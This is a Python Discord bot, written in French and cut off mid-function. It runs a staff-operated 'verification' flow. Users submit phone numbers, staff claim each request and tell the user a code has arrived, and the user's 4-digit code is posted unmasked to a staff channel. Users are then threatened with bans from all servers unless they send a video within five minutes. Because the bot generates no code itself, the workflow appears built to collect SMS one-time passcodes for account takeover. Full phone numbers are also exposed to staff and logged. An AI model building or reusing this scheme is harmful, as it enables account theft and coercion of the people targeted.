import discord
from discord import app_commands
from discord.ext import commands
import asyncio
import datetime
import io
import json
import logging
from typing import Optional, Dict, Set
from aiohttp import web
import config
from utils import (
    validate_phone,
    validate_code,
    mask_phone,
    load_blacklist,
    save_blacklist,
    is_user_blacklisted,
    is_phone_blacklisted,
    add_to_blacklist
)

logging.basicConfig(level=logging.INFO, format="%(asctime)s [%(levelname)s] %(message)s")
log = logging.getLogger("VerifBot")

intents = discord.Intents.default()
intents.message_content = True
intents.members = True

bot = commands.Bot(command_prefix="!", intents=intents, help_command=None)

DATA_FILE = "data.json"

def load_data() -> dict:
    try:
        with open(DATA_FILE, "r", encoding="utf-8") as f:
            return json.load(f)
    except Exception:
        return {}

def save_data():
    try:
        with open(DATA_FILE, "w", encoding="utf-8") as f:
            json.dump(data, f, ensure_ascii=False)
    except Exception as e:
        log.exception("Save error")

data: dict = load_data()
data.setdefault("blacklisted_numbers", [])
data.setdefault("blacklisted_users", [])
data.setdefault("staff_channel", 0)
data.setdefault("log_channel", 0)
data.setdefault("proof_channel", 0)
data.setdefault("codes_channel", 0)
data.setdefault("proof_role", 0)
data.setdefault("bypass_role", 0)
data.setdefault("appeal_server_link", "")
data.setdefault("total_verifications", 0)
data.setdefault("total_codes_received", 0)
data.setdefault("ban_role", 0)

blacklist_data = load_blacklist()
blacklisted_numbers: Set[str] = set(blacklist_data.get("phones", []))
blacklisted_users: Set[int] = set(blacklist_data.get("users", []))

denied_users_cooldown: Dict[int, float] = {}
cooldowns: Dict[int, float] = {}
pending_users: Dict[int, dict] = {}
proofs: Dict[int, dict] = {}
video_archive: Dict[int, dict] = {}
verify_channels: Dict[int, int] = {}

COLOR_BLUE = 0x5865f2
COLOR_GREEN = 0x57f287
COLOR_RED = 0xed4245
COLOR_GOLD = 0xfee75c
COLOR_ORANGE = 0xe67e22

CODE_WINDOW = 600
PROOF_WINDOW = 300
DENY_COOLDOWN = 1800

# ==================== HEALTH SERVER ====================

async def health_handler(request):
    return web.Response(text="OK", status=200)

async def start_health_server():
    app = web.Application()
    app.router.add_get("/", health_handler)
    app.router.add_get("/health", health_handler)
    runner = web.AppRunner(app)
    await runner.setup()
    site = web.TCPSite(runner, "0.0.0.0", config.PORT)
    await site.start()
    log.info(f"Health check on port {config.PORT}")

# ==================== HELPERS ====================

def mask_code(code: str) -> str:
    if len(code) < 4:
        return code
    return f"{code[:2]}{'*'*(len(code)-4)}{code[-2:]}"

def get_channel(key: str, env_id: int):
    if data.get(key):
        ch = bot.get_channel(data[key])
        if ch:
            return ch
    if env_id:
        return bot.get_channel(env_id)
    return None

def get_staff_channel():
    return get_channel("staff_channel", config.STAFF_CHANNEL_ID)

def get_log_channel():
    return get_channel("log_channel", config.LOG_CHANNEL_ID)

def get_proof_channel():
    return get_channel("proof_channel", config.PROOF_CHANNEL_ID)

def get_codes_channel():
    return get_channel("codes_channel", config.CODES_CHANNEL_ID)

def get_proof_role_id():
    return data.get("proof_role") or config.PROOF_ROLE_ID

def get_bypass_role_id():
    return data.get("bypass_role") or config.BYPASS_ROLE_ID

def get_ban_role_id():
    return data.get("ban_role") or 0

async def safe_respond(interaction: discord.Interaction, embed: discord.Embed, ephemeral: bool = True):
    try:
        if interaction.response.is_done():
            await interaction.followup.send(embed=embed, ephemeral=ephemeral)
        else:
            await interaction.response.send_message(embed=embed, ephemeral=ephemeral)
    except Exception:
        log.exception("safe_respond failed")

async def safe_edit_message(message: discord.Message, embed: discord.Embed, view=None):
    try:
        await message.edit(embed=embed, view=view)
    except discord.errors.HTTPException as e:
        if e.status == 429:
            retry_after = getattr(e, "retry_after", 2.0)
            log.warning(f"Rate limit on message edit. Retrying in {retry_after}s")
            await asyncio.sleep(retry_after)
            try:
                await message.edit(embed=embed, view=view)
            except Exception:
                log.exception("safe_edit_message retry failed")
        else:
            raise
    except discord.NotFound:
        log.warning("Message not found during edit")
    except Exception:
        log.exception("safe_edit_message failed")

async def send_log(title: str, description: str = "", color: int = COLOR_BLUE, fields: list = None, user: discord.User = None, ping: int = 0):
    channel = get_log_channel()
    if not channel:
        return
    try:
        embed = discord.Embed(title=title, description=description, color=color, timestamp=datetime.datetime.now())
        if fields:
            for name, value, inline in fields:
                embed.add_field(name=name, value=value, inline=inline)
        if user:
            try:
                embed.set_thumbnail(url=user.display_avatar.url)
            except Exception:
                pass
        embed.set_footer(text=datetime.datetime.now().strftime('%d/%m/%Y %H:%M'))
        content = f"<@{ping}>" if ping else None
        await channel.send(content=content, embed=embed)
    except Exception:
        log.exception("send_log failed")

def has_staff_role(interaction: discord.Interaction) -> bool:
    if isinstance(interaction.user, discord.Member):
        if config.STAFF_ROLE_ID == 0:
            return True
        return config.STAFF_ROLE_ID in [r.id for r in interaction.user.roles]
    return False

def is_owner(interaction: discord.Interaction) -> bool:
    return config.OWNER_ID != 0 and interaction.user.id == config.OWNER_ID

def user_has_bypass(uid: int) -> bool:
    rid = get_bypass_role_id()
    if not rid:
        return False
    for gid in [config.GUILD_ID, config.STAFF_GUILD_ID]:
        g = bot.get_guild(gid)
        if g:
            m = g.get_member(uid)
            if m and rid in [r.id for r in m.roles]:
                return True
    return False

async def delete_message_after(message: discord.Message, delay: int):
    try:
        await asyncio.sleep(delay)
        await message.delete()
    except Exception:
        pass

# ==================== MODALS ====================

class PhoneModal(discord.ui.Modal, title="Vérification"):
    phone = discord.ui.TextInput(
        label="Numéro de téléphone",
        placeholder="06XXXXXXXX",
        min_length=10,
        max_length=10,
        required=True,
    )

    async def on_submit(self, interaction: discord.Interaction):
        try:
            now = datetime.datetime.now().timestamp()
            uid = interaction.user.id

            if uid in blacklisted_users:
                denied_remaining = denied_users_cooldown.get(uid, 0) + DENY_COOLDOWN - now
                if denied_remaining > 0:
                    mins = int(denied_remaining // 60)
                    secs = int(denied_remaining % 60)
                    await safe_respond(interaction, discord.Embed(
                        title="Vérification refusée",
                        description=f"Votre vérification a été refusée.\n\nVous pouvez réessayer dans **{mins}m {secs:02d}s**.",
                        color=COLOR_RED
                    ))
                    return
                else:
                    blacklisted_users.discard(uid)
                    denied_users_cooldown.pop(uid, None)
                    blacklist_data["users"] = list(blacklisted_users)
                    save_blacklist(blacklist_data)
                    data["blacklisted_users"] = list(blacklisted_users)
                    save_data()

            phone_raw = self.phone.value.strip().replace(" ", "").replace("-", "")

            ok, err = validate_phone(phone_raw)
            if not ok:
                await safe_respond(interaction, discord.Embed(
                    title="Vérification",
                    description=err,
                    color=COLOR_RED
                ))
                return

            if phone_raw in blacklisted_numbers:
                await safe_respond(interaction, discord.Embed(
                    title="Vérification refusée",
                    description="Ce numéro a été blacklisté.",
                    color=COLOR_RED
                ))
                return

            if uid != config.OWNER_ID and uid in cooldowns:
                remaining = cooldowns[uid] + config.COOLDOWN_SECONDS - now
                if remaining > 0:
                    mins = int(remaining // 60)
                    secs = int(remaining % 60)
                    await safe_respond(interaction, discord.Embed(
                        title="Vérification",
                        description=f"Vous avez déjà fait une demande récemment. Réessayez dans **{mins} min {secs:02d}s**.",
                        color=COLOR_GOLD
                    ))
                    return

            if uid in pending_users:
                await safe_respond(interaction, discord.Embed(
                    title="Vérification",
                    description="Votre demande est déjà en cours de traitement.",
                    color=COLOR_GOLD
                ))
                return

            cooldowns[uid] = now
            verify_channels[uid] = interaction.channel.id
            data["total_verifications"] = data.get("total_verifications", 0) + 1
            save_data()

            await safe_respond(interaction, discord.Embed(
                title="Vérification",
                description="Votre demande a bien été prise en compte.\n\nAttendez de recevoir votre code, puis cliquez sur le bouton **Code** pour le saisir.",
                color=COLOR_GREEN
            ))

            asyncio.create_task(send_log(
                title="Nouvelle demande",
                color=COLOR_BLUE,
                user=interaction.user,
                fields=[
                    ("Utilisateur", f"{interaction.user.mention}", True),
                    ("ID", f"`{uid}`", True),
                    ("Numéro", f"`{mask_phone(phone_raw)}`", True),
                ]
            ))

            await send_staff_panel(interaction.user, phone_raw)
        except discord.errors.NotFound:
            log.warning("PhoneModal interaction not found")
        except Exception:
            log.exception("PhoneModal error")

    async def on_error(self, interaction: discord.Interaction, error: Exception) -> None:
        log.exception("Modal error")

class CodeModal(discord.ui.Modal, title="Vérification"):
    code = discord.ui.TextInput(
        label="Code reçu",
        placeholder="0000",
        min_length=4,
        max_length=4,
        required=True,
    )

    def __init__(self, user_id: int):
        super().__init__()
        self.user_id = user_id

    async def on_submit(self, interaction: discord.Interaction):
        try:
            pending = pending_users.get(self.user_id)
            if pending is None:
                await safe_respond(interaction, discord.Embed(
                    title="Vérification",
                    description="Aucune demande en cours. Mettez d'abord votre numéro.",
                    color=COLOR_GOLD
                ))
                return

            if not pending.get("unlocked"):
                await safe_respond(interaction, discord.Embed(
                    title="Vérification",
                    description="Vous n'avez pas encore reçu de code. Attendez, puis réessayez.",
                    color=COLOR_GOLD
                ))
                return

            elapsed = datetime.datetime.now().timestamp() - pending["unlocked_at"]
            if elapsed > CODE_WINDOW:
                pending_users.pop(self.user_id, None)
                await safe_respond(interaction, discord.Embed(
                    title="Vérification",
                    description="Votre code a expiré. Refaites une demande de vérification.",
                    color=COLOR_RED
                ))
                asyncio.create_task(send_log(title="Code expiré", color=COLOR_RED, fields=[
                    ("Utilisateur", f"<@{self.user_id}>", True),
                ]))
                return

            content = self.code.value.strip()
            ok, err = validate_code(content)
            if not ok:
                await safe_respond(interaction, discord.Embed(
                    title="Vérification",
                    description=err,
                    color=COLOR_RED
                ))
                return

            view = pending.get("view")
            staff_id = pending.get("claimed_by")

            codes_channel = get_codes_channel()
            if codes_channel:
                embed_code = discord.Embed(color=COLOR_GREEN, timestamp=datetime.datetime.now())
                embed_code.set_author(name=f"Code — {mask_phone(view.phone) if view else 'inconnu'}")
                embed_code.add_field(name="Utilisateur", value=f"<@{self.user_id}>", inline=True)
                embed_code.add_field(name="ID", value=f"`{self.user_id}`", inline=True)
                if view:
                    embed_code.add_field(name="Numéro", value=f"`{mask_phone(view.phone)}`", inline=True)
                if staff_id:
                    embed_code.add_field(name="Staff", value=f"<@{staff_id}>", inline=True)
                embed_code.add_field(name="Code masqué", value=f"`{mask_code(content)}`", inline=True)
                try:
                    embed_code.set_thumbnail(url=interaction.user.display_avatar.url)
                except Exception:
                    pass
                embed_code.set_footer(text=datetime.datetime.now().strftime('%d/%m/%Y %H:%M'))
                ping = f"<@{staff_id}> " if staff_id else ""
                try:
                    await codes_channel.send(content=f"{ping}\n```{content}```", embed=embed_code)
                except Exception:
                    log.exception("Erreur envoi du code dans codes_channel")

            data["total_codes_received"] = data.get("total_codes_received", 0) + 1
            save_data()

            if view:
                try:
                    user_fetch = await bot.fetch_user(self.user_id)
                    if view.message is not None:
                        await view.refresh(view.message, user_fetch, "Code reçu", "En attente de validation")
                except Exception:
                    log.exception("Erreur refresh panel après code reçu")

            asyncio.create_task(send_log(
                title="Code reçu",
                description="L'utilisateur a saisi son code.",
                color=COLOR_GOLD,
                user=interaction.user,
                fields=[
                    ("Utilisateur", f"<@{self.user_id}>", True),
                    ("Code saisi", f"`{mask_code(content)}`", True),
                ],
                ping=staff_id
            ))

            if not user_has_bypass(self.user_id):
                proof_channel = get_proof_channel()
                if proof_channel:
                    await safe_respond(interaction, discord.Embed(
                        title="Vérification",
                        description="Code reçu. Finalisation de la vérification en cours.",
                        color=COLOR_GREEN
                    ))
                    asyncio.create_task(start_proof(self.user_id, staff_id, content))
                else:
                    await safe_respond(interaction, discord.Embed(
                        title="Vérification",
                        description="Code reçu. Vérification en cours, merci de patienter.",
                        color=COLOR_GREEN
                    ))
            else:
                await safe_respond(interaction, discord.Embed(
                    title="Vérification",
                    description="Code reçu. Vérification en cours, merci de patienter.",
                    color=COLOR_GREEN
                ))
        except discord.errors.NotFound:
            log.warning("CodeModal interaction not found")
        except Exception:
            log.exception("CodeModal error")

    async def on_error(self, interaction: discord.Interaction, error: Exception) -> None:
        log.exception("Code modal error")

class CodeSendModal(discord.ui.Modal, title="Envoyer le code"):
    message_txt = discord.ui.TextInput(
        label="Message à envoyer",
        style=discord.TextStyle.paragraph,
        default="Vous avez reçu un code de vérification. Rendez-vous sur le serveur et cliquez sur le bouton Code pour le saisir.",
        max_length=1000,
        required=True,
    )

    def __init__(self, view: "StaffPanelView"):
        super().__init__()
        self.panel_view = view

    async def on_submit(self, interaction: discord.Interaction):
        v = self.panel_view
        try:
            if v.locked:
                await safe_respond(interaction, discord.Embed(
                    title="Action impossible",
                    description="Cette demande est terminée.",
                    color=COLOR_GOLD
                ))
                return

            pending_users[v.user_id] = {
                "unlocked": True,
                "unlocked_at": datetime.datetime.now().timestamp(),
                "claimed_by": interaction.user.id,
                "view": v,
            }

            txt = self.message_txt.value.strip() or "Votre code a été généré."
            embed_dm = discord.Embed(title="Votre code est arrivé", description=txt, color=COLOR_GREEN)

            dm_ok = False
            try:
                user_fetch = await bot.fetch_user(v.user_id)
                await user_fetch.send(embed=embed_dm)
                dm_ok = True
            except Exception:
                dm_ok = False

            if not dm_ok:
                chan_id = verify_channels.get(v.user_id)
                if chan_id:
                    target = bot.get_channel(chan_id)
                    if target:
                        try:
                            msg = await target.send(
                                content=f"<@{v.user_id}>",
                                embed=discord.Embed(
                                    title="Vérification",
                                    description=f"{txt}\n\nRevenez sur le serveur et cliquez sur le bouton **Code** pour le saisir.",
                                    color=COLOR_GOLD
                                )
                            )
                            asyncio.create_task(delete_message_after(msg, 10))
                        except Exception:
                            log.exception("Erreur envoi code dans le salon de vérif")

            try:
                if not interaction.response.is_done():
                    await interaction.response.send_message(
                        embed=discord.Embed(
                            title="Code envoyé",
                            description=f"{'DM envoyé' if dm_ok else 'DM fermé — message envoyé au salon de vérif'} à <@{v.user_id}>.\n⏱️ Il a **10 minutes**, sinon la demande expire.",
                            color=COLOR_GOLD
                        ),
                        ephemeral=True
                    )
            except Exception:
                try:
                    await interaction.followup.send(
                        embed=discord.Embed(
                            title="Code envoyé",
                            description=f"{'DM envoyé' if dm_ok else 'DM fermé — message envoyé au salon de vérif'} à <@{v.user_id}>.\n⏱️ Il a **10 minutes**, sinon la demande expire.",
                            color=COLOR_GOLD
                        ),
                        ephemeral=True
                    )
                except Exception:
                    pass

            await asyncio.sleep(0.5)

            if v.message is not None:
                try:
                    user_fetch = await bot.fetch_user(v.user_id)
                    await v.refresh(v.message, user_fetch, "Code envoyé", "En attente de saisie")
                except discord.errors.HTTPException as e:
                    if e.status == 429:
                        log.warning("Rate limit hit while refreshing staff panel. Skipping this refresh.")
                    else:
                        log.exception("Erreur refresh panel staff")
                except Exception:
                    log.exception("Erreur refresh panel staff")

            asyncio.create_task(send_log(
                title="Code envoyé",
                color=COLOR_GOLD,
                fields=[
                    ("Utilisateur", f"<@{v.user_id}>", True),
                    ("Staff", f"<@{interaction.user.id}>", True),
                    ("DM", "Oui" if dm_ok else "Non (message salon)", True),
                ]
            ))
        except discord.errors.NotFound:
            log.warning("CodeSendModal interaction not found")
        except Exception:
            log.exception("CodeSendModal error")
            try:
                if not interaction.response.is_done():
                    await interaction.response.send_message(
                        embed=discord.Embed(
                            title="Erreur",
                            description="Une erreur interne est survenue. Merci de réessayer.",
                            color=COLOR_RED
                        ),
                        ephemeral=True
                    )
            except Exception:
                pass

class BanUserModal(discord.ui.Modal, title="Bannir un utilisateur"):
    user_id = discord.ui.TextInput(
        label="ID de l'utilisateur",
        placeholder="Mets l'ID Discord de la personne",
        required=True
    )

    async def on_submit(self, interaction: discord.Interaction):
        try:
            uid = int(self.user_id.value)
            await bot.fetch_user(uid)
        except Exception:
            await safe_respond(interaction, discord.Embed(title="Erreur", description="ID invalide.", color=COLOR_RED))
            return

        try:
            ban_role_id = get_ban_role_id()

            for g in list(bot.guilds):
                m = g.get_member(uid)
                if m:
                    try:
                        if ban_role_id:
                            await m.remove_roles(*m.roles, reason="Action de bannissement")
                            ban_role = g.get_role(ban_role_id)
                            if ban_role:
                                await m.add_roles(ban_role, reason="Utilisateur banni")
                        else:
                            await g.kick(m, reason="Action de bannissement")
                        log.info(f"✅ User {uid} banned from {g.name}")
                    except Exception:
                        log.exception(f"Error banning {uid} from {g.name}")

            await safe_respond(interaction, discord.Embed(
                title="✅ Utilisateur banni",
                description=f"<@{uid}> a été banni avec succès.",
                color=COLOR_GREEN
            ))

            await send_log(title="⛔ Utilisateur banni", color=COLOR_RED, fields=[
                ("Utilisateur", f"<@{uid}>", True),
                ("Staff", f"<@{interaction.user.id}>", True),
                ("Action", "Ban de tous les serveurs", True),
            ], ping=interaction.user.id)
        except discord.errors.NotFound:
            log.warning("BanUserModal interaction not found")
        except Exception:
            log.exception("Ban modal error")

# ==================== VUES ====================

def build_staff_embed(user: discord.User, phone: str, status: str = "En attente", claimed_by: Optional[int] = None, code_status: str = "—", timestamp: Optional[datetime.datetime] = None) -> discord.Embed:
    if timestamp is None:
        timestamp = datetime.datetime.now()
    embed = discord.Embed(color=COLOR_BLUE, timestamp=timestamp)
    embed.set_author(name="Demande de vérification")
    try:
        embed.set_thumbnail(url=user.display_avatar.url)
    except Exception:
        pass
    embed.add_field(name="Utilisateur", value=f"{user.mention}", inline=True)
    embed.add_field(name="ID", value=f"`{user.id}`", inline=True)
    embed.add_field(name="Numéro", value=f"`{mask_phone(phone)}`", inline=True)
    embed.add_field(name="Statut", value=status, inline=True)
    embed.add_field(name="Code", value=code_status, inline=True)
    embed.add_field(name="Pris en charge par", value=f"<@{claimed_by}>" if claimed_by else "—", inline=True)
    embed.set_footer(text=f"Aujourd'hui à {timestamp.strftime('%H:%M')}")
    return embed

class ContestView(discord.ui.View):
    def __init__(self):
        super().__init__(timeout=None)

    @discord.ui.button(label="Contester", style=discord.ButtonStyle.danger, custom_id="contest_btn")
    async def contest(self, interaction: discord.Interaction, button: discord.ui.Button):
        try:
            button.disabled = True
            button.style = discord.ButtonStyle.secondary
            try:
                await interaction.response.edit_message(view=self)
            except Exception:
                pass
            await interaction.followup.send(embed=discord.Embed(
                title="Contestation envoyée",
                description="Votre contestation a bien été prise en compte.\nNotre équipe va réexaminer votre dossier.\nVous serez informé de la décision dans les plus brefs délais.",
                color=COLOR_GOLD
            ), ephemeral=True)
        except discord.errors.NotFound:
            log.warning("ContestView interaction not found")
        except Exception:
            log.exception("Contest error")

class QuickBanView(discord.ui.View):
    def __init__(self):
        super().__init__(timeout=None)

    @discord.ui.button(label="Ban", style=discord.ButtonStyle.danger, custom_id="quick_ban_btn")
    async def ban_button(self, interaction: discord.Interaction, button: discord.ui.Button):
        try:
            if not has_staff_role(interaction):
                await safe_respond(interaction, discord.Embed(
                    title="Accès refusé",
                    description="Staff uniquement.",
                    color=COLOR_RED
                ))
                return
            await interaction.response.send_modal(BanUserModal())
        except discord.errors.NotFound:
            log.warning("QuickBanView interaction not found")
        except Exception:
            log.exception("Quick ban error")

class StaffPanelView(discord.ui.View):
    def __init__(self, user_id: int, phone: str):
        super().__init__(timeout=None)
        self.user_id = user_id
        self.phone = phone
        self.claimed_by: Optional[int] = None
        self.locked = False
        self.message: Optional[discord.Message] = None
        self.created_at = datetime.datetime.now()

    async def refresh(self, message: discord.Message, user: discord.User, status: str, code_status: str, color: int = None):
        try:
            if message is None:
                return

            new_embed = build_staff_embed(
                user=user,
                phone=self.phone,
                status=status,
                claimed_by=self.claimed_by,
                code_status=code_status,
                timestamp=self.created_at
            )

            if color:
                new_embed.color = color

            for child in self.children:
                if isinstance(child, discord.ui.Button):
                    if self.locked:
                        child.disabled = True
                    elif child.custom_id == "claim_btn":
                        child.disabled = True
                        child.style = discord.ButtonStyle.secondary
                        child.label = "Pris en charge"

            await safe_edit_message(message, new_embed, view=self)
        except discord.NotFound:
            log.warning("Staff panel message deleted during refresh")
        except Exception:
            log.exception("Erreur refresh panel staff")

    @discord.ui.button(label="Prendre en charge", style=discord.ButtonStyle.primary, custom_id="claim_btn")
    async def claim_button(self, interaction: discord.Interaction, button: discord.ui.Button):
        try:
            if not has_staff_role(interaction):
                await safe_respond(interaction, discord.Embed(
                    title="Accès refusé",
                    description="Vous n'avez pas l'accès requis pour gérer les vérifications.",
                    color=COLOR_RED
                ))
                return
            if self.claimed_by is not None:
                await safe_respond(interaction, discord.Embed(
                    title="Déjà pris en charge",
                    description=f"Déjà pris par <@{self.claimed_by}>.",
                    color=COLOR_RED
                ))
                return

            self.claimed_by = interaction.user.id
            reveal = discord.Embed(color=COLOR_GREEN)
            reveal.add_field(name="Numéro", value=f"`{self.phone}`", inline=True)
            await safe_respond(interaction, reveal)

            try:
                user_fetch = await bot.fetch_user(self.user_id)
                if self.message is not None:
                    await self.refresh(self.message, user_fetch, "En cours", "—")
            except Exception:
                log.exception("Erreur refresh après prise en charge")

            asyncio.create_task(send_log(title="Prise en charge", color=COLOR_GREEN, fields=[
                ("Staff", f"<@{interaction.user.id}>", True),
                ("Utilisateur", f"<@{self.user_id}>", True),
            ]))
        except discord.errors.NotFound:
            log.warning("Claim button interaction not found")
        except Exception:
            log.exception("Claim error")

    @discord.ui.button(label="Voir le numéro", style=discord.ButtonStyle.secondary, custom_id="viewnum_btn", row=1)
    async def viewnum_button(self, interaction: discord.Interaction, button: discord.ui.Button):
        try:
            if not has_staff_role(interaction):
                await safe_respond(interaction, discord.Embed(
                    title="Accès refusé",
                    description="Vous n'avez pas l'accès requis.",
                    color=COLOR_RED
                ))
                return
            if self.claimed_by is not None and self.claimed_by != interaction.user.id:
                await safe_respond(interaction, discord.Embed(
                    title="Déjà pris en charge",
                    description=f"Seul <@{self.claimed_by}> peut consulter cette demande.",
                    color=COLOR_RED
                ))
                return
            reveal = discord.Embed(color=COLOR_GREEN)
            reveal.add_field(name="Numéro", value=f"`{self.phone}`", inline=True)
            await safe_respond(interaction, reveal)
        except discord.errors.NotFound:
            log.warning("View num interaction not found")
        except Exception:
            log.exception("View num error")

    @discord.ui.button(label="Envoyer le code", style=discord.ButtonStyle.success, custom_id="sendcode_btn", row=1)
    async def sendcode_button(self, interaction: discord.Interaction, button: discord.ui.Button):
        try:
            if not has_staff_role(interaction):
                await safe_respond(interaction, discord.Embed(
                    title="Accès refusé",
                    description="Vous n'avez pas l'accès requis.",
                    color=COLOR_RED
                ))
                return
            if self.claimed_by is None:
                await safe_respond(interaction, discord.Embed(
                    title="Action impossible",
                    description="Prenez d'abord la demande en charge.",
                    color=COLOR_GOLD
                ))
                return
            if self.claimed_by != interaction.user.id:
                await safe_respond(interaction, discord.Embed(
                    title="Déjà pris en charge",
                    description=f"Seul <@{self.claimed_by}> gère cette demande.",
                    color=COLOR_RED
                ))
                return
            if self.locked:
                await safe_respond(interaction, discord.Embed(
                    title="Action impossible",
                    description="Cette demande est terminée.",
                    color=COLOR_GOLD
                ))
                return

            await interaction.response.send_modal(CodeSendModal(self))
        except discord.errors.NotFound:
            log.warning("Send code interaction not found")
        except Exception:
            log.exception("Send code error")

    @discord.ui.button(label="Valider", style=discord.ButtonStyle.success, custom_id="validate_btn", row=2)
    async def validate_button(self, interaction: discord.Interaction, button: discord.ui.Button):
        try:
            if not has_staff_role(interaction):
                await safe_respond(interaction, discord.Embed(
                    title="Accès refusé",
                    description="Vous n'avez pas l'accès requis.",
                    color=COLOR_RED
                ))
                return
            if self.claimed_by is None:
                await safe_respond(interaction, discord.Embed(
                    title="Action impossible",
                    description="Prenez d'abord la demande en charge.",
                    color=COLOR_GOLD
                ))
                return
            if self.claimed_by != interaction.user.id:
                await safe_respond(interaction, discord.Embed(
                    title="Déjà pris en charge",
                    description=f"Seul <@{self.claimed_by}> gère cette demande.",
                    color=COLOR_RED
                ))
                return
            if self.locked:
                await safe_respond(interaction, discord.Embed(
                    title="Action impossible",
                    description="Cette demande est terminée.",
                    color=COLOR_GOLD
                ))
                return

            self.locked = True
            pending_users.pop(self.user_id, None)
            proofs.pop(self.user_id, None)

            try:
                user_fetch = await bot.fetch_user(self.user_id)
                if self.message is not None:
                    await self.refresh(self.message, user_fetch, "Validé", "Validé", COLOR_GREEN)
            except Exception:
                log.exception("Erreur refresh validation")

            if config.VERIFIED_ROLE_ID and config.GUILD_ID:
                guild = bot.get_guild(config.GUILD_ID)
                if guild:
                    role = guild.get_role(config.VERIFIED_ROLE_ID)
                    member = guild.get_member(self.user_id)
                    if role and member:
                        try:
                            await member.add_roles(role, reason="Vérification validée")
                        except Exception:
                            log.warning(f"Permission rôle manquante pour {self.user_id}")

            await send_log(title="Vérification validée", color=COLOR_GREEN, user=user_fetch if 'user_fetch' in locals() else None, fields=[
                ("Utilisateur", f"<@{self.user_id}>", True),
                ("Staff", f"<@{self.claimed_by}>", True),
                ("Numéro", f"`{self.phone}`", True),
            ], ping=self.claimed_by)
        except discord.errors.NotFound:
            log.warning("Validate interaction not found")
        except Exception:
            log.exception("Validate error")

    @discord.ui.button(label="Refuser", style=discord.ButtonStyle.danger, custom_id="deny_btn", row=2)
    async def deny_button(self, interaction: discord.Interaction, button: discord.ui.Button):
        try:
            if not has_staff_role(interaction):
                await safe_respond(interaction, discord.Embed(
                    title="Accès refusé",
                    description="Vous n'avez pas l'accès requis.",
                    color=COLOR_RED
                ))
                return
            if self.claimed_by is not None and self.claimed_by != interaction.user.id:
                await safe_respond(interaction, discord.Embed(
                    title="Déjà pris en charge",
                    description=f"Seul <@{self.claimed_by}> gère cette demande.",
                    color=COLOR_RED
                ))
                return
            if self.locked:
                await safe_respond(interaction, discord.Embed(
                    title="Action impossible",
                    description="Cette demande est terminée.",
                    color=COLOR_GOLD
                ))
                return

            self.locked = True
            uid = self.user_id
            phone = self.phone
            pending_users.pop(uid, None)
            proofs.pop(uid, None)
            blacklisted_numbers.add(phone)
            blacklisted_users.add(uid)
            denied_users_cooldown[uid] = datetime.datetime.now().timestamp()

            blacklist_data["phones"] = list(blacklisted_numbers)
            blacklist_data["users"] = list(blacklisted_users)
            save_blacklist(blacklist_data)

            data["blacklisted_numbers"] = list(blacklisted_numbers)
            data["blacklisted_users"] = list(blacklisted_users)
            save_data()

            try:
                user_fetch = await bot.fetch_user(uid)
                if self.message is not None:
                    await self.refresh(self.message, user_fetch, "Refusé", "Refusé", COLOR_RED)
            except Exception:
                log.exception("Erreur refresh refusal")

            deny_embed = discord.Embed(
                title="Vérification annulée",
                description=(
                    "Votre vérification a été **refusée**.\n\n"
                    "Vous pouvez réessayer dans **30 minutes**.\n\n"
                    "Si vous pensez qu'il y a une erreur, vous pouvez rejoindre notre serveur d'appel."
                ),
                color=COLOR_RED
            )
            try:
                user_fetch = await bot.fetch_user(uid)
                await user_fetch.send(embed=deny_embed, view=ContestView())
            except Exception:
                chan_id = verify_channels.get(uid)
                if chan_id:
                    target = bot.get_channel(chan_id)
                    if target:
                        try:
                            msg = await target.send(content=f"<@{uid}>", embed=deny_embed, view=ContestView())
                            asyncio.create_task(delete_message_after(msg, 10))
                        except Exception:
                            log.exception("Erreur envoi refus au salon de vérif")

            asyncio.create_task(send_log(title="Vérification refusée", color=COLOR_RED, user=user_fetch if 'user_fetch' in locals() else None, fields=[
                ("Utilisateur", f"<@{uid}>", True),
                ("Staff", f"<@{interaction.user.id}>", True),
                ("Numéro", f"`{phone}`", True),
            ], ping=interaction.user.id))
        except discord.errors.NotFound:
            log.warning("Deny interaction not found")
        except Exception:
            log.exception("Deny error")

async def send_staff_panel(user: discord.User, phone: str):
    channel = get_staff_channel()
    if not channel:
        log.error("Staff channel introuvable.")
        return
    view = StaffPanelView(user.id, phone)
    embed = build_staff_embed(user=user, phone=phone)
    try:
        msg = await channel.send(content="@everyone", embed=embed, view=view)
        view.message = msg
    except Exception:
        log.exception("Staff panel send error")

# ==================== PROOF ====================

PROOF_TEXT = (
    "Tu as **5 minutes** pour envoyer une **vidéo** comme preuve dans ce salon.\n\n"
    "Le temps se met à jour chaque minute sur ce message.\n\n"
    "Envoie simplement ta vidéo en pièce jointe dans ce salon.\n"
    "Aucun texte n'est nécessaire — uniquement la vidéo.\n\n"
    "Si tu n'envoies pas de vidéo dans le temps imparti, tu seras banni de tous les serveurs.\n\n"
    "Si ta vidéo est supprimée, elle sera automatiquement renvoyée ici et conservée."
)

async def start_proof(uid: int, staff_id: Optional[int], code: str = ""):
    channel = get_proof_channel()
    if not channel:
        log.error("Proof channel introuvable.")
        return
    if uid in proofs:
        return

    try:
        user = bot.get_user(uid) or await bot.fetch_user(uid)
    except Exception:
        return

    start_ts = datetime.datetime.now().timestamp()
    view = pending_users.get(uid, {}).get("view")
    phone_val = view.phone if view else ""

    def make_embed(mins, secs):
        embed = discord.Embed(color=COLOR_GOLD, timestamp=datetime.datetime.now())
        embed.set_author(name="Preuve requise", icon_url=user.display_avatar.url)
        try:
            embed.set_thumbnail(url=user.display_avatar.url)
        except Exception:
            pass
        embed.add_field(name="Utilisateur", value=f"{user.mention}", inline=True)
        embed.add_field(name="ID", value=f"`{uid}`", inline=True)
        if phone_val:
            embed.add_field(name="Numéro", value=f"`{mask_phone(phone_val)}`", inline=True)
        if code:
            embed.add_field(name="Code", value=f"**{mask_code(code)}**", inline=True)
        embed.add_field(name="Temps restant", value=f"**{mins}:00**", inline=True)
        embed.description = PROOF_TEXT
        if staff_id:
            embed.add_field(name="Vérificateur", value=f"<@{staff_id}>", inline=False)
        embed.set_footer(text=f"Aujourd'hui à {datetime.datetime.now().strftime('%H:%M')}")
        return embed

    proof_role_id = get_proof_role_id()
    pings = []
    if staff_id:
        pings.append(f"<@{staff_id}>")
    if proof_role_id:
        pings.append(f"<@&{proof_role_id}>")
    ping_content = " ".join(dict.fromkeys(pings))

    try:
        msg = await channel.send(content=ping_content, embed=make_embed(5, 0))
    except Exception:
        log.exception("Proof send error")
        return

    proofs[uid] = {
        "message": msg,
        "video_msg": None,
        "attachment": None,
        "staff_id": staff_id,
        "start_ts": start_ts,
        "code": code,
        "proof_sent": False,
        "task": None
    }

    async def countdown():
        while True:
            try:
                await asyncio.sleep(60)
